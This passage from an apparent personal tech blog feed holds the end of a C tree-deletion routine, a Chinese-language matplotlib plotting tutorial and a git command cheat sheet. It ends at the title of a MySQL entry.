class="line">                root-&gt;data = <span class="built_in">treeDeleteMin</span>(&amp;(root-&gt;right));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                toFree = root;</span><br><span class="line">                *rootptr = toFree-&gt;left;</span><br><span class="line">                <span class="built_in">free</span>(toFree);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;data &lt; value)</span><br><span class="line">            <span class="built_in">treeDelete</span>(&amp;root-&gt;right,value);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">treeDelete</span>(&amp;root-&gt;left,value)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">treeRebalance</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithms </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib</title>
      <link href="/2023/04/01/matplotlib/"/>
      <url>/2023/04/01/matplotlib/</url>
      
        <content type="html"><![CDATA[<h1 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h1><h2 id="why-matplotlib"><a href="#why-matplotlib" class="headerlink" title="why matplotlib?"></a>why matplotlib?</h2><p>如果您使用过“工科神器”MATLAB，您一定会惊叹于MATLAB中惊人的可视化能力，其中的函数绘图，成为了无数SCI论文中真实数据配图的来源。小小的plot函数，画出了人类先进科学进步的曲线。</p><p>python中的matplotlib库，与MATLAB中的plot函数有点像，也许这正是它名字的来源。这是一个2D绘图库，利用它可以画出许多高质量的图像。只需几行代码即可生成直方图，条形图，饼图，散点图等。Matplotlib可用于Python脚本，Python和IPython shell，Jupyter笔记本，Web应用程序服务器和四个图形用户界面工具包。</p><p>希望以下教程可以为您带来一些帮助。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>请查看上方anaconda教程，配置好python环境。使用命令<code>pip install matplotlib</code> 或 <code>conda install matplotlib </code> 进行安装。使用时，直接import即可。</p><h2 id="Matplotlib-pyplot"><a href="#Matplotlib-pyplot" class="headerlink" title="Matplotlib.pyplot"></a>Matplotlib.pyplot</h2><p>Matplotlib 中的 pyplot 模块是一个类似命令风格的函数集合，这使得 Matplotlib 的工作模式和 MATLAB 相似。</p><p>pyplot 模块提供了可以用来绘图的各种函数，比如创建一个画布，在画布中创建一个绘图区域，或是在绘图区域添加一些线、标签等。以下表格对这些函数做了简单地介绍。若您有MATLAB基础，看着本节即可上手使用。</p><h2 id="绘图类型"><a href="#绘图类型" class="headerlink" title="绘图类型"></a>绘图类型</h2><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>Bar</td><td>绘制条形图</td></tr><tr><td>Barh</td><td>绘制水平条形图</td></tr><tr><td>Boxplot</td><td>绘制箱型图</td></tr><tr><td>Hist</td><td>绘制直方图</td></tr><tr><td>his2d</td><td>绘制2D直方图</td></tr><tr><td>Pie</td><td>绘制饼状图</td></tr><tr><td>Plot</td><td>在坐标轴上画线或者标记</td></tr><tr><td>Polar</td><td>绘制极坐标图</td></tr><tr><td>Scatter</td><td>绘制x与y的散点图</td></tr><tr><td>Stackplot</td><td>绘制堆叠图</td></tr><tr><td>Stem</td><td>用来绘制二维离散数据绘制（又称为“火柴图”）</td></tr><tr><td>Step</td><td>绘制阶梯图</td></tr><tr><td>Quiver</td><td>绘制一个二维按箭头</td></tr></tbody></table><h3 id="Image函数"><a href="#Image函数" class="headerlink" title="Image函数"></a>Image函数</h3><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>Imread</td><td>从文件中读取图像的数据并形成数组。</td></tr><tr><td>Imsave</td><td>将数组另存为图像文件。</td></tr><tr><td>Imshow</td><td>在数轴区域内显示图像。</td></tr></tbody></table><h3 id="Axis函数"><a href="#Axis函数" class="headerlink" title="Axis函数"></a>Axis函数</h3><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>Axes</td><td>在画布(Figure)中添加轴</td></tr><tr><td>Text</td><td>向轴添加文本</td></tr><tr><td>Title</td><td>设置当前轴的标题</td></tr><tr><td>Xlabel</td><td>设置x轴标签</td></tr><tr><td>Xlim</td><td>获取或者设置x轴区间大小</td></tr><tr><td>Xscale</td><td>设置x轴缩放比例</td></tr><tr><td>Xticks</td><td>获取或设置x轴刻标和相应标签</td></tr><tr><td>Ylabel</td><td>设置y轴的标签</td></tr><tr><td>Ylim</td><td>获取或设置y轴的区间大小</td></tr><tr><td>Yscale</td><td>设置y轴的缩放比例</td></tr><tr><td>Yticks</td><td>获取或设置y轴的刻标和相应标签</td></tr></tbody></table><h3 id="Figure函数"><a href="#Figure函数" class="headerlink" title="Figure函数"></a>Figure函数</h3><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>Figtext</td><td>在画布上添加文本</td></tr><tr><td>Figure</td><td>创建一个新画布</td></tr><tr><td>Show</td><td>显示数字</td></tr><tr><td>Savefig</td><td>保存当前画布</td></tr><tr><td>Close</td><td>关闭画布窗口</td></tr></tbody></table><h2 id="第一个绘图程序"><a href="#第一个绘图程序" class="headerlink" title="第一个绘图程序"></a>第一个绘图程序</h2><p>首先导入 Matplotlib 包中的 Pyplot 模块，并以 as 别名的形式简化引入包的名称。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure><p>接下来，使用 NumPy 提供的函数 arange() 创建一组数据来绘制图像。</p><p>如果您对numpy库并不了解，可以理解为这就是在生成列表数据即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#引入numpy包</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment">#获得0到2π之间的数据，每个数据间隔0.05</span></span><br><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br></pre></td></tr></table></figure><p>我们这里来绘制sin函数的值。使用numpy库内置函数计算出值（实际上是矩阵），放入y中，作为函数值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = np.sin(x)</span><br></pre></td></tr></table></figure><p>此时，使用plot函数进行绘制即可。绘制完后，需要使用show函数展示出来才行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.plot(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318120404283.png" alt="image-20230318120404283"></p><p>这个图像实在是光秃秃。我们在show之前添加一些属性设置。设置上图像的标题、标签。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt.xlabel(<span class="string">&quot;angle&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;sine&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;sine wave&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318120557553.png" alt="image-20230318120557553"></p><p>这样，图像勉强能看了。</p><p>您也可以在 Jupyter 笔记本中运行 Matplotlib 的绘图程序。通过命令行或者开始菜单的方式启动 Jupyter 笔记本。启动成功后，将上述代码拷贝到输入行内，如下所示：</p><p><img src="/.io//1522405532-1.gif" alt="jupyter使用"></p><p>%matplotlib inline 是 Jupyter 提供的魔法命令，它可以把输出图显示在笔记本内部，否则会以查看器的形式单独显示。</p><h2 id="title、label、坐标轴设置"><a href="#title、label、坐标轴设置" class="headerlink" title="title、label、坐标轴设置"></a>title、label、坐标轴设置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plt.title(<span class="string">&quot;title&quot;</span>)<span class="comment">#括号当中输入标题的名称</span></span><br><span class="line">plt.xlim(<span class="number">0</span>,<span class="number">6</span>) <span class="comment">#x轴坐标轴</span></span><br><span class="line">plt.ylim((<span class="number">0</span>, <span class="number">3</span>))<span class="comment">#y轴坐标轴</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;X&#x27;</span>)<span class="comment">#x轴标签</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Y&#x27;</span>)<span class="comment">#y轴标签</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>可以对相应属性进行设置。</p><p>其中，x、y坐标轴的设置，又一般使用plot函数进行设置。</p><h2 id="Figure画布对象与Axes坐标轴对象"><a href="#Figure画布对象与Axes坐标轴对象" class="headerlink" title="Figure画布对象与Axes坐标轴对象"></a>Figure画布对象与Axes坐标轴对象</h2><p>在matplotlib中，整个图像为一个Figure对象。在Figure对象中可以包含一个或者多个Axes对象。每个Axes(ax)对象都是一个拥有自己坐标系统的<strong>绘图区域</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">6</span>, <span class="number">3</span>))</span><br><span class="line">plt.plot(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line">plt.plot(<span class="number">3</span>, <span class="number">3</span> * <span class="number">2</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318121336375.png" alt="image-20230318121336375"></p><p>如果我们要在一个代码中生成多张图，就需要多个画布，也就是多个figure对象。那么此时，我们就转变为对各个画布对象进行操作，而非plt库的默认画布。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment">#创建图形对象</span></span><br><span class="line">fig = plt.figure()</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>figsize</td><td>指定画布的大小，(宽度,高度)，单位为英寸。</td></tr><tr><td>dpi</td><td>指定绘图对象的分辨率，即每英寸多少个像素，默认值为80。</td></tr><tr><td>facecolor</td><td>背景颜色。</td></tr><tr><td>dgecolor</td><td>边框颜色。</td></tr><tr><td>frameon</td><td>是否显示边框。</td></tr></tbody></table><p>有了画布，我们还要添加坐标轴对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax = fig.add_axes([<span class="number">0.1</span>,<span class="number">0.1</span>,<span class="number">0.8</span>,<span class="number">0.8</span>])</span><br></pre></td></tr></table></figure><p>add_axes() 的参数值是一个序列，序列中的 4 个数字分别对应图形的左侧，底部，宽度，和高度，且每个数字必须介于 0 到 1 之间。</p><p>即将画布的宽、高作为 1 个单位。比如，[ 0.1, 0.1, 0.8, 0.8]，它代表着从画布 10% 的位置开始绘制, 宽高是画布的 80%。</p><p>坐标轴对象可以设置标题，设置标签，进行绘图。与原本的库一样的调用方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = fig.add_axes([<span class="number">0.1</span>,<span class="number">0.1</span>,<span class="number">0.8</span>,<span class="number">0.8</span>])</span><br><span class="line">ax.plot(x,y)</span><br><span class="line">ax.set_title(<span class="string">&quot;sine wave&quot;</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;angle&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;sine&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318123811971.png" alt="image-20230318123811971"></p><h2 id="label、legend图例设置"><a href="#label、legend图例设置" class="headerlink" title="label、legend图例设置"></a>label、legend图例设置</h2><p>在画图时，可以添加label属性，传入图例。并通过legend启动，添加loc属性选择图例位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">plt.plot(x,y,label=<span class="string">&quot;sin&quot;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&quot;best&quot;</span>)<span class="comment">#图例位置，可选best，center等</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="一图多线"><a href="#一图多线" class="headerlink" title="一图多线"></a>一图多线</h2><p>在同一个figure下，直接使用plot进行画图即可。同一张图上可以全部显示出来。注意添加label参数以作区别。</p><p>如果要画多张图，可以在两个plot方法之间使用figure方法创造一个新的窗口，进行分别展示。</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>有时候我们需要对特定的点进行标注，我们可以使用 plt.annotate 函数来实现:</p><p>s: 注释信息内容</p><p>xy:箭头点所在的坐标位置</p><p>xytext:注释内容的坐标位置</p><p>arrowprops：设置指向箭头的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x=np.linspace(<span class="number">0</span>,<span class="number">10</span>,<span class="number">200</span>)<span class="comment">#从0到10之间等距产生200个值</span></span><br><span class="line">y=np.sin(x)</span><br><span class="line"></span><br><span class="line">plt.plot(x,y,linestyle=<span class="string">&#x27;:&#x27;</span>,color=<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">plt.annotate(text=<span class="string">&#x27;here&#x27;</span>,xy=(<span class="number">3</span>,np.sin(<span class="number">3</span>)),xytext=(<span class="number">4</span>,-<span class="number">0.5</span>),weight=<span class="string">&#x27;bold&#x27;</span>,color=<span class="string">&#x27;b&#x27;</span>,arrowprops=<span class="built_in">dict</span>(arrowstyle=<span class="string">&#x27;-|&gt;&#x27;</span>,color=<span class="string">&#x27;k&#x27;</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318121953844.png" alt="image-20230318121953844"></p><h2 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h2><p>如果需要将多张子图展示在一起，可以使用 subplot() 实现。即在调用 plot()函数之前需要先调用 subplot() 函数。</p><p>该函数的第一个参数代表子图的总行数，</p><p>第二个参数代表子图的总列数，</p><p>第三个参数代表活跃区域。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ax1 = plt.subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">plt.plot(x,np.sin(x), <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ax2 = plt.subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, sharey=ax1) <span class="comment"># 与 ax1 共享y轴</span></span><br><span class="line">plt.plot(x, np.cos(x), <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ax3 = plt.subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">plt.plot(x,x, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ax4 = plt.subplot(<span class="number">2</span>, <span class="number">2</span>, <span class="number">4</span>, sharey=ax3) <span class="comment"># 与 ax3 共享y轴</span></span><br><span class="line">plt.plot(x, <span class="number">2</span>*x, <span class="string">&#x27;y&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318122150290.png" alt="image-20230318122150290"></p><p>同样的，这些图像支持各自传入各种各样的参数。</p><h2 id="plot的参数"><a href="#plot的参数" class="headerlink" title="plot的参数"></a>plot的参数</h2><p>plot函数支持传入各种参数，不需要在外部再手动设置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#单条线：</span></span><br><span class="line">plot([x], y, [fmt], data=<span class="literal">None</span>, **kwargs)</span><br><span class="line"><span class="comment">#多条线一起画</span></span><br><span class="line">plot([x], y, [fmt], [x2], y2, [fmt2], ..., **kwargs)</span><br></pre></td></tr></table></figure><p>可选参数[fmt] 是一个字符串来定义图的基本属性如：颜色（color），点型（marker），线型（linestyle），</p><p>具体形式  fmt &#x3D; ‘[color] [ marker ] [ line ]’</p><p>fmt接收的是每个属性的单个字母缩写。</p><pre><code>=============    ===============================character        color=============    ===============================``&#39;b&#39;``          blue 蓝``&#39;g&#39;``          green 绿``&#39;r&#39;``          red 红``&#39;c&#39;``          cyan 蓝绿``&#39;m&#39;``          magenta 洋红``&#39;y&#39;``          yellow 黄``&#39;k&#39;``          black 黑``&#39;w&#39;``          white 白=============    ===============================</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">=============    ===============================</span><br><span class="line">    character        description</span><br><span class="line">    =============    ===============================</span><br><span class="line">    ``&#x27;.&#x27;``          point marker</span><br><span class="line">    ``&#x27;,&#x27;``          pixel marker</span><br><span class="line">    ``&#x27;o&#x27;``          circle marker</span><br><span class="line">    ``&#x27;v&#x27;``          triangle_down marker</span><br><span class="line">    ``&#x27;^&#x27;``          triangle_up marker</span><br><span class="line">    ``&#x27;&lt;&#x27;``          triangle_left marker</span><br><span class="line">    ``&#x27;&gt;&#x27;``          triangle_right marker</span><br><span class="line">    ``&#x27;1&#x27;``          tri_down marker</span><br><span class="line">    ``&#x27;2&#x27;``          tri_up marker</span><br><span class="line">    ``&#x27;3&#x27;``          tri_left marker</span><br><span class="line">    ``&#x27;4&#x27;``          tri_right marker</span><br><span class="line">    ``&#x27;s&#x27;``          square marker</span><br><span class="line">    ``&#x27;p&#x27;``          pentagon marker</span><br><span class="line">    ``&#x27;*&#x27;``          star marker</span><br><span class="line">    ``&#x27;h&#x27;``          hexagon1 marker</span><br><span class="line">    ``&#x27;H&#x27;``          hexagon2 marker</span><br><span class="line">    ``&#x27;+&#x27;``          plus marker</span><br><span class="line">    ``&#x27;x&#x27;``          x marker</span><br><span class="line">    ``&#x27;D&#x27;``          diamond marker</span><br><span class="line">    ``&#x27;d&#x27;``          thin_diamond marker</span><br><span class="line">    ``&#x27;|&#x27;``          vline marker</span><br><span class="line">    ``&#x27;_&#x27;``          hline marker</span><br><span class="line">    =============    ===============================</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">=============    ===============================</span><br><span class="line">character        description</span><br><span class="line">=============    ===============================</span><br><span class="line">``&#x27;-&#x27;``          solid line style 实线</span><br><span class="line">``&#x27;--&#x27;``         dashed line style 虚线</span><br><span class="line">``&#x27;-.&#x27;``         dash-dot line style 点画线</span><br><span class="line">``&#x27;:&#x27;``          dotted line style 点线</span><br><span class="line">=============    ===============================</span><br></pre></td></tr></table></figure><p>另外，支持color&#x3D;，linestyle&#x3D;，label&#x3D;关键字传参，具体可参照官方文档，或参考上方plt.xxx设置。一般都有对应的参数。</p><h2 id="各种其他图"><a href="#各种其他图" class="headerlink" title="各种其他图"></a>各种其他图</h2><p>参考绘图类型节即可。这里以柱状图为例。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">10</span>)</span><br><span class="line">y = np.random.randint(<span class="number">0</span>,<span class="number">20</span>,<span class="number">10</span>)</span><br><span class="line">plt.bar(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/2023/03/27/git/"/>
      <url>/2023/03/27/git/</url>
      
        <content type="html"><![CDATA[<h1 id="git远程仓库"><a href="#git远程仓库" class="headerlink" title="git远程仓库"></a>git远程仓库</h1><p>网址：<a href="https://github.com/">https://github.com</a></p><p>张朝阳账户：<a href="mailto:&#122;&#104;&#x61;&#110;&#103;&#x7a;&#104;&#97;&#x6f;&#x79;&#97;&#110;&#103;&#x40;&#x63;&#x68;&#x64;&#x2e;&#101;&#x64;&#x75;&#46;&#99;&#x6e;">&#122;&#104;&#x61;&#110;&#103;&#x7a;&#104;&#97;&#x6f;&#x79;&#97;&#110;&#103;&#x40;&#x63;&#x68;&#x64;&#x2e;&#101;&#x64;&#x75;&#46;&#99;&#x6e;</a>   用户名zhzj0218，密码：一般密码</p><p>以将&#x2F;d&#x2F;gitproject&#x2F;pycharm_python_and_pyqt中的文件同步到git中的zhzj0218下的pycharm_python_and_pyqt为例</p><p>[TOC]</p><h2 id="查看分支状态"><a href="#查看分支状态" class="headerlink" title="查看分支状态"></a>查看分支状态</h2><p>git status</p><h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><p>git init 把当前的目录变成Git管理的版本库</p><p>git status 查看当前分支状态</p><p>git add . 把当前文件夹下的文件提交到暂存区</p><p>紧接着git commit -m “提交标签，如first proposed” 把暂存区提交到版本库</p><p>执行git status查看状态，确保工作区是干净的，没有需要提交的内容</p><p>（git log查看提交日志，git reflog查看提交版本号）</p><h2 id="远程同步"><a href="#远程同步" class="headerlink" title="远程同步"></a>远程同步</h2><p>git remote -v查看远程版本库信息</p><p>创建github上的git仓库，例如在github的zhzj0218下创建了仓库pycharm_python_and_pyqt.git</p><p>git remote add origin <a href="https://github.com/zhzj0218/pycharm_python_and_pyqt.git">https://github.com/zhzj0218/pycharm_python_and_pyqt.git</a></p><p>将本地仓库关联到Github仓库</p><p>再次查看git remote -v，确认远程仓库关联成功</p><p>git push -u origin master 将本地仓库的内容推送到Github仓库</p><h2 id="远程库克隆到本地"><a href="#远程库克隆到本地" class="headerlink" title="远程库克隆到本地"></a>远程库克隆到本地</h2><p>git clone <a href="https://github.com/zhzj0218/pycharm_python_and_pyqt.git">https://github.com/zhzj0218/pycharm_python_and_pyqt.git</a></p><p>将远程仓库的内容克隆到本地</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="创建版本库-1"><a href="#创建版本库-1" class="headerlink" title="创建版本库"></a>创建版本库</h3><p>git clone <url> 克隆远程版本库到本地</url></p><p>git init 初始化本地版本库</p><h3 id="修改和提交"><a href="#修改和提交" class="headerlink" title="修改和提交"></a>修改和提交</h3><p>git status 查看状态，也可查看冲突的文件</p><p>git dif 查看变更内容</p><p>git add . 跟踪所有改动过的内容</p><p>git add <file> 跟踪制定的文件</file></p><p>git mv <old> <new> 文件改名</new></old></p><p>git rm <file> 删除文件</file></p><p>git rm –cached <file> 停止跟踪文件但不删除</file></p><p>git commit -m “commit message” 提交所有更新过的文件</p><p>git commit –amend 修改最后一次提交</p><h3 id="查看提交历史"><a href="#查看提交历史" class="headerlink" title="查看提交历史"></a>查看提交历史</h3><p>git log 查看提交历史</p><p>git log -p <file> 查看指定文件的提交历史</file></p><p>git blame <file> 以列表方式查看指定文件的提交历史</file></p><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h3><p>git reset –hard HEAD 撤销工作目录中所有未提交文件的修改内容</p><p>git checkout HEAD <file> 撤销指定的未提交文件的修改内容</file></p><p>git revert <commit> 撤销指定的提交</commit></p><p>git reset –hard HEAD^ 还原到上一个版本</p><p>git reset –hard 18b6a 回到之前版本，此处18b6a为某个版本号，版本号无需写全</p><p>（git log查看提交历史，可看到版本号，git log –pretty&#x3D;oneline可简化输出查看版本号，HEAD^表示上一次版本，HEAD^^表示上上一个版本，也可以用数字表示，HEAD~2，也可以用git reflog查看版本号，此时的版本号较短，为简短版本号）</p><p>git checkout – <file> 文件没有添加到暂存区时，撤回工作区的修改</file></p><p>git reset HEAD <file> 文件已经添加到暂存区时，撤销暂存区的修改，然后再使用git check – <file> 撤回工作区的修改</file></file></p><h3 id="分支与标签"><a href="#分支与标签" class="headerlink" title="分支与标签"></a>分支与标签</h3><p>git branch 显示所有本地分支</p><p>git checkout &lt;branch&#x2F;tag&gt; 切换到指定分支或者标签</p><p>git branch <new-branch> 创建新分支</new-branch></p><p>git branch -d <branch> 删除本地分支</branch></p><p>git tag 列出所有本地标签</p><p>git tag <tagname>基于最新提交创建标签</tagname></p><p>git tag -d <tagname> 删除标签</tagname></p><h3 id="合并与衍合"><a href="#合并与衍合" class="headerlink" title="合并与衍合"></a>合并与衍合</h3><p>git merge <branch> 合并指定分支到当前分支</branch></p><p>git rebase <branch> 衍合指定分支到当前分支</branch></p><h3 id="远程操作"><a href="#远程操作" class="headerlink" title="远程操作"></a>远程操作</h3><p>git remote -v 查看远程版本库信息</p><p>git remote show <remote> 查看指定远程版本库信息</remote></p><p>git remote add <remote> <url> 添加远程版本库</url></remote></p><p>git fetch <remote> 从远程库获取代码</remote></p><p>git pull <remote> <branch> 下载代码及快速合并</branch></remote></p><p>git push <remote> <branch> 上传代码及快速合并</branch></remote></p><p>git push <remote>  :&lt;branch&#x2F;tag-name&gt; 删除远程分支或标签</remote></p><p>git push –tags 上传所有标签</p><p>git remote rm origin移除原先错误的origin remote</p><h3 id="查看和修改用户名和邮箱"><a href="#查看和修改用户名和邮箱" class="headerlink" title="查看和修改用户名和邮箱"></a>查看和修改用户名和邮箱</h3><p>git config user.name查看用户名</p><p>git config user.email查看邮箱</p><p>git config –global user.name “your name”修改用户名为your name</p><p>git config –global user.email “your email”修改用户名为your email</p><h3 id="密码输入错误的解决方法"><a href="#密码输入错误的解决方法" class="headerlink" title="密码输入错误的解决方法"></a>密码输入错误的解决方法</h3><p>在控制面板，管理windows凭证，修改正确的密码</p><h3 id="大文件上传"><a href="#大文件上传" class="headerlink" title="大文件上传"></a>大文件上传</h3><p>git默认不能上传超过100M的文件，如果上传100M的文件，则会出现fatal: The remote end hung up unexpectedly的错误，表示存在大文件不能上传。因此需要处理大文件的上传。</p><p>示例：假设当前存在后缀为.exe，.zip及.whl的大文件，处理步骤如下：</p><p>git lfs install 安装lfs</p><p>git lfs track “*.zip”</p><p>git lfs track “*.exe”</p><p>git lfs track “*.whl”</p><p>则文件夹中生成的.gitattributes文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*.exe filter=lfs diff=lfs merge=lfs -text</span><br><span class="line">*.zip filter=lfs diff=lfs merge=lfs -text</span><br><span class="line">*.whl filter=lfs diff=lfs merge=lfs -text</span><br></pre></td></tr></table></figure><p>git add .gitattributes 将.gitattributes文件加入到暂存区</p><p>git commit -m “add lfs file” 提交文件</p><p>git push origin master 将本地仓库内容提交到Github仓库（包含大文件提交，提交的大文件具有lfs标签，表明为大文件）</p>]]></content>
      
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/2023/03/27/MySQL/"/>
      <url>/2023/03/27/MySQL/</url>
      
